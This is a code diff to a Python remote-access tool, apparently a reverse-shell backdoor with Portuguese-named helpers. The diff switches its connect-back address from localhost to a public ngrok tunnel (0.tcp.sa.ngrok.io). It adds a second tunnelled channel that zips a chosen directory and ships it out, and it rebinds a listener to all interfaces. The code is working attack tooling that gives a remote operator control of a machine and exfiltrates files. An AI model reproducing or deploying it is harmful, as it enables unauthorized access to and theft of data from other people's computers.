@@ -7,8 +7,8 @@ import requests
 import platform
 
 
-ip = "127.0.0.1"
-port = 8081
+ip = '0.tcp.sa.ngrok.io'
+port = 15469
 
 
 def connection(ip, port):
@@ -73,10 +73,7 @@ Manual:
             server(s)
 
         elif data.startswith("Upload"):
-
-            s.send(b"Enter the directory to zip> ")
-            directory_name = s.recv(1024).decode().strip()
-            client_path(s, directory_name)
+            client_path(s)
 
         elif data.startswith("info_ip"):
             obter_informacoes_ip(s)
@@ -106,37 +103,35 @@ def compactar_diretorio(diretorio, arquivo_saida):
                 relativo = os.path.relpath(caminho_completo, diretorio)
                 zipf.write(caminho_completo, relativo)
 
-def client_path(s, directory_name):
+def client_path(s):
     try:
-        if not os.path.isdir(directory_name):
-            s.send(b"\n[!] Invalid directory closing client connection.\n")
-            return
-
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.send(b"\n[!] Trying connection with the server...\n")
 
-        client.connect(('127.0.0.1', 8887))
+        s.send(b"\n[!] Trying connection with the server...\n")
+        client.connect(('0.tcp.sa.ngrok.io', 12872))
         print('Connected [!]\n')
+
         s.send(b"\n[!] Connection Received from the server.\n ")
         time.sleep(2)
 
-
+        s.send(b"Enter the directory to zip> ")
+        directory_name = s.recv(1024).decode().strip()
         client.send(directory_name.encode())
 
-        with open('received_file.zip', 'wb') as file:
+        with open('received_directory.zip', 'wb') as file:
             while True:
                 data = client.recv(4096)
                 if not data:
                     break
-                if data:
-                    file.write(data)
-                    s.send(b'\n[+] File received as received_file.zip [ok]\n')
-                    client.close()
-                    s.send(b"\n[-] Client closed\n")
+                file.write(data)
+
+        s.send(b'\n[+] File received as received_file.zip [ok]\n')
+        client.close()
+        s.send(b"\n[-] Server closed\n")
 
     except ConnectionRefusedError as e:
         print("\nConnection error: ", e)
-        exit()
+        return
     except Exception as e:
         print("\nConnection error: ", e)
     except KeyboardInterrupt:
@@ -144,15 +139,15 @@ def client_path(s, directory_name):
 
 
 def clear_zip():
-    zip = "received_file.zip"
-    os.path.isfile(zip)
-    os.remove(zip)
+    zip = "received_directory.zip"
+    if os.path.isfile(zip):
+        os.remove(zip)
 
 def server(s):
     try:
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-        server.bind(('127.0.0.1', 8889))
+        server.bind(('0.0.0.0', 8887)) #listening on 0.0.0.0 all interfaces.
         server.listen(1)
 
         s.send(b'\n[!] Waiting for a connection...\n')
@@ -168,9 +163,10 @@ def server(s):
             connection.close()
             server.close()
             s.send(b"\n[-] Server closed\n")
+            return
             
 
-        arquivo_zip_saida = 'received_file.zip'
+        arquivo_zip_saida = 'received_directory.zip'
 
         compactar_diretorio(diretorio_cliente, arquivo_zip_saida)
 
@@ -180,7 +176,7 @@ def server(s):
             connection.close()
             server.close()
             s.send(b"\n[-] Server closed\n")
-            exit()
+            return
 
         with open(arquivo_zip_saida, 'rb') as file:
             while True:
